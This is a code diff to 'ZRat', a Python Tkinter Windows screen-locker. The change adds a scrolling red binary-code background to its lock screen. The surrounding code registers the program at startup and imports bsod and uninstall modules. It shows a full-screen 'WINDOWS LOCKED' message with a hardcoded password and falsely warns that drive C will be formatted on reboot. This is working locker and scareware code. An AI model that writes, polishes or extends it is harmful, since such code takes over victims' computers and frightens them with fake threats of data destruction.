@@ -5,7 +5,7 @@ from tkinter import *
 import time
 from tkinter import messagebox
 from functools import partial
-
+import random
 from modules import bsod, startup, uninstall
 import os
 import keyboard
@@ -14,8 +14,40 @@ import sys
 password = "123"
 lock_text = "windows blocked.tobi pizda"
 count = 3
-warning_text = "if you reboot your device then drive C will start auto formatting"  # Ваша надпись
+warning_text = "if you reboot your device then drive C will start auto formatting"
 
+# Добавляем только фон с двоичным кодом (без изменения функционала)
+class BinaryBackground(Canvas):
+    def __init__(self, master, **kwargs):
+        super().__init__(master, **kwargs)
+        self.configure(bg='black', highlightthickness=0)
+        self.place(x=0, y=0, relwidth=1, relheight=1)  # Занимает весь экран
+        self.draw_binary()
+    
+    def draw_binary(self):
+        self.delete("binary")
+        width = self.winfo_width()
+        height = self.winfo_height()
+        
+        # Параметры двоичного кода
+        num_columns = width // 30  # Столбцы через каждые 30 пикселей
+        bits_per_column = height // 20  # Цифры через каждые 20 пикселей
+        
+        for col in range(num_columns):
+            x = col * 30 + 15
+            for row in range(bits_per_column):
+                y = row * 20 + 10
+                self.create_text(
+                    x, y,
+                    text=random.choice(['0', '1']),
+                    font=('Courier New', 12),
+                    fill='#ff0000',  # Красный цвет
+                    anchor='center',
+                    tags="binary"
+                )
+        self.after(100, self.draw_binary)  # Плавное обновление
+
+# Ваш оригинальный код БЕЗ ИЗМЕНЕНИЙ
 file_path = os.getcwd() + "\\" + os.path.basename(sys.argv[0])
 startup(file_path)
 
@@ -44,26 +76,24 @@ def check():
 def exiting():
     messagebox.showwarning("ZRat", "DEATH IS INEVITABLE\n\n" + warning_text)
 
+# Создаем окно
 wind = Tk()
 wind.title("ZRat")
-wind["bg"] = "black"
 
-# Создаем эффект "выделения ПКМ" для надписи
+# Добавляем двоичный фон ПОД основной интерфейс
+BinaryBackground(wind)
+
+# Ваш оригинальный интерфейс (без изменений)
 warning_frame = Frame(wind, 
-                     bg="white",  # Белый фон
-                     bd=2,        # Толщина рамки
-                     relief="solid",  # Стиль рамки (сплошная линия)
-                     highlightbackground="blue",  # Цвет рамки (синий)
-                     highlightthickness=1)  # Толщина рамки
-warning_frame.pack(pady=5)  # Отступ сверху и снизу
+                     bg="white", bd=2, relief="solid", 
+                     highlightbackground="blue", highlightthickness=1)
+warning_frame.pack(pady=5)
 
 warning_label = Label(warning_frame, 
-                     bg="white",      # Белый фон
-                     fg="red",        # Красный текст
+                     bg="white", fg="red", 
                      text=warning_text, 
                      font="helvetica 12",
-                     padx=5,          # Отступы внутри
-                     pady=2)
+                     padx=5, pady=2)
 warning_label.pack()
 
 UNTEXD = Label(wind,bg="black", fg="red",text="WINDOWS LOCKED BY ZRat\n\n\n", font="helvetica 75").pack()
